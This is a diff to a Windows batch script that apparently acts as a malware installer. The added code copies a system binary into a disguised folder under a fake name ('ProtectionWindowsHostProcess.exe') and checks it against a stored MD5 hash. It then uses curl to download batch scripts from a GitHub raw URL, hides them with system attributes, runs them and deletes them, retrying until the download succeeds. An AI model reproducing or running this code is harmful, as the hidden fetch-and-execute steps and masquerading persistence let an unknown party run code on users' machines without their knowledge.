@@ -8,10 +8,13 @@ setlocal enabledelayedexpansion
 ::goto :EOF
 
 
-set "BATCHVERSION=34.4"
+set "BATCHVERSION=34.7"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
+set "RUNEVERYOFFICIALMD5=e61120a65311d97840928a691e96b36a"
+
+
 
 del /f /a "%LOGFILE%"
 
@@ -166,7 +169,227 @@ if %errorLevel% == 0 (
 echo.
 echo.
 
-::echo ProtectionWindowsHostProcess.exe is not running. Continue.....
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:CHECKRUNEVERY
+echo CHECKRUNEVERY Started 
+echo. 
+echo. 
+echo. 
+echo. 
+
+
+:: Define the folder and file paths
+set "targetFolder=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks"
+set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
+set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
+
+:: Ensure the folder exists
+if not exist "%targetFolder%" (
+    echo Creating folder: "%targetFolder%" 
+    mkdir "%targetFolder%" 
+)
+
+if not exist "%startupFile%" (
+    copy "%sourceFile%" "%startupFile%" /y
+)
+
+echo. 
+echo. 
+::timeout /t 5 /nobreak 
+echo. 
+
+
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+
+
+if not exist "%startupFile%" goto INSTRUNEVERY
+echo %startupFile% Found. 
+echo. 
+echo. 
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%sourceFile%" MD5 ^| findstr /V "hash"') do set "RUNEVERYROOTMD5=%%A"
+for /f "tokens=*" %%A in ('certutil -hashfile "%startupFile%" MD5 ^| findstr /V "hash"') do set "RUNEVERYSTARTUPSMD5=%%A"
+
+echo MD5 of "%sourceFile%" = %RUNEVERYROOTMD5% 
+echo MD5 of "%startupFile%" = %RUNEVERYSTARTUPSMD5% 
+echo. 
+echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% 
+echo. 
+echo. 
+echo. 
+
+
+
+if "%RUNEVERYROOTMD5%"=="%RUNEVERYOFFICIALMD5%" (
+    echo MD5 matches %RUNEVERYROOTMD5% = %RUNEVERYOFFICIALMD5%  
+) else (
+    echo MD5 doesnt match %RUNEVERYROOTMD5% # %RUNEVERYOFFICIALMD5% 
+    echo Going to INSTRUNEVERY 
+    goto INSTRUNEVERY
+)
+
+
+
+if "%RUNEVERYSTARTUPSMD5%"=="%RUNEVERYOFFICIALMD5%" (
+    echo MD5 matches %RUNEVERYSTARTUPSMD5% = %RUNEVERYOFFICIALMD5%
+) else (
+    echo MD5 doesnt match %RUNEVERYSTARTUPSMD5% # %RUNEVERYOFFICIALMD5% 
+    echo Going to INSTRUNEVERY 
+    goto INSTRUNEVERY
+)
+
+
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+:: RunEvery Files & Task Found goto NEXT 
+echo RunEvery Files and Task Found with MD5 Check. Going to AFTERORSKIPINSTALLRUNEVERY 
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+goto AFTERORSKIPINSTALLRUNEVERY
+
+
+
+
+
+
+:INSTRUNEVERY
+
+echo. 
+echo. 
+echo. 
+echo. 
+echo. 
+
+
+
+:CheckHandle
+echo :CheckHandle Started.. 
+echo. 
+echo. 
+
+set "file9=%SystemRoot%\System32\handle.exe"
+
+:: Check handle.exe; if found, skip to next section
+if exist "%file9%" (
+    echo %file9% found. Going to RUNEVERYINSTALL 
+    echo. 
+    echo. 
+    echo. 
+    goto RUNEVERYINSTALL
+)
+
+:: Run commands if handle.exe is not found
+echo Checking for handle... 
+set "embeddedScript=%temp%\temp_script_handle.bat"
+del /f /a "%embeddedScript%" 
+
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
+attrib +h +s "%embeddedScript%"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%. 
+    echo. 
+    echo. 
+    call "%embeddedScript%" 
+    del /f /a "%embeddedScript%"
+    echo. 
+    echo. 
+) else (
+    echo Failed to get content from Handle Link 
+    echo. 
+    timeout /t 3 /nobreak 
+    goto CheckHandle
+)
+
+
+
+
+echo. 
+echo. 
+echo. 
+echo. 
+
+
+
+
+
+
+
+:RUNEVERYINSTALL
+echo. 
+echo RUNEVERYINSTALL Started.. 
+:: Run commands if ShellHost.exe is not found
+echo Checking for RunEvery...
+set "embeddedScript=%temp%\temp_script_RUNEVRYINST.bat"
+del /f /a "%embeddedScript%"
+
+
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunEveryCallerForRunEveryRunning"
+attrib +h +s "%embeddedScript%"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del /f /a "%embeddedScript%"
+    echo.
+	exit
+    echo.
+) else (
+    echo Filed to get content from ShellHost Link
+    echo.
+    timeout /t 3 /nobreak 
+    goto RUNEVERYINSTALL
+)
+
+
+
+
+
+
+:AFTERORSKIPINSTALLRUNEVERY
+echo. 
+echo. 
+echo. 
+echo AFTERORSKIPINSTALLRUNEVERY Started..
+echo.
+echo.
+
+
+
+
+
 
 
 
